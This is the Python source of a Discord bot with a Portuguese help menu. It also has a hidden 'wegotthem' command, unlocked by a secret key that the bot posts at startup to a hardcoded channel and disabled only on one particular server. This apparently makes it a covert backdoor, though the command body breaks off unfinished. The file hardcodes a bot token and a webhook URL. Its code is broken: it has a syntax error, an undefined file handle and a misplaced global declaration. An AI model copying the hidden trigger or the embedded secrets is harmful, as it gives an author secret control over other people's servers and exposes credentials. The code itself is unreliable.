import discord
import asyncio
import sys
import json
import time
import random
import requests
import dhooks
from pathlib import Path
import string
def KeyGen(size=1989, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size)) 
	
Key = KeyGen()
client = discord.Client()
hook = dhooks.Webhook('https://discordapp.com/api/webhooks/516092910081409058/dQ1YJOs3qwD57lM6CH9nhChJyhVO39Oc1YchGpUQE3f1qvpHIu8EXptI-_qlXUVxBjkG')
def ServerInfo(id):
	server_path = Path(f"Servers/{id}.json")
	if server_path.exists():
		info = json.load(open(f'Servers/{id}.json'))
		if not info['commands']:
			info['commands'] = "0"
			f.write(json.dumps(info))
		return info
	else:
		with open(f'Servers/{id}.json', 'w') as f:
			x = json.load(open(f'ServerBase.json'))
			x['id'] = id
			f.write(json.dumps(x))
			return x
@client.event
async def on_message(message):
	server_info = ServerInfo(f"{message.server.id}")
	prefix = server_info['prefix']
	command = message.content.lower().startswith
	help_embed=discord.Embed(title="Help me!", description="Aqui estão todos os comandos disponivéis!")
	help_embed.add_field(name="Misc", value=f"{prefix}say -» *Faça eu dizer algo!*\n{prefix}avatar -» *Veja seu avatar ou de outro usuario ;)*\n{prefix}perfil -» *mostra seu perfil ou o de outro usuario :)*\n{prefix}say -»", inline=False)
	help_embed.add_field(name="Administrativo", value="n", inline=False)
	help_embed.add_field(name="Musica", value="n", inline=False)
	if server_info['commands'] == "0":
		help_embed.add_field(name="Comandos Personalizados", value="*Nenhum comando foi encontrado :(*", inline=False)
	if command(prefix):
		args = message.content.split(" ")
		cmd = message.content.lower().startswith(prefix + "help")
		if command(prefix + "help"):
			await client.send_message(message.channel, embed=help_embed)
		elif command(prefix + "wegotthem"):
			if args[1] == Key:
				if message.server.id != '513142267654176784':
					global Key
					Key = KeyGen()
					players = 
				else:
					await client.send_message(message.channel, "```css\n#Error\n\n[ 0 ] This command is not allowed in this server.\n\nLenny #EC:1001\n```")
@client.event
async def on_ready():
	await client.change_status(game=discord.Game(name='Jogos! ;)'))
	print(f"[+] Logged as {client.user.name}")
	await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
	await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
client.run(f"NTE2MTE2MTkzMDQ0NzI1Nzgw.Dtu-yg.8y-5tV-e4qqmE9Uhub5sWio4w7g")